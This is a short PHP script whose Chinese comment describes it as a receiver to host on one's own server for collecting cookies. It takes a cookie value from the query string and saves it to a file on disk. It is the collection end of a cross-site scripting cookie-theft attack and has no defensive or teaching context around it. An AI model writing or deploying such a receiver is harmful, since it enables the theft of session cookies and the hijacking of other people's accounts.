<?php
#此脚本放在自己服务，用来接收cookie
$cookie = $_GET['cookie'];
file_put_contents("/luoyc/data.txt", $cookie);
?>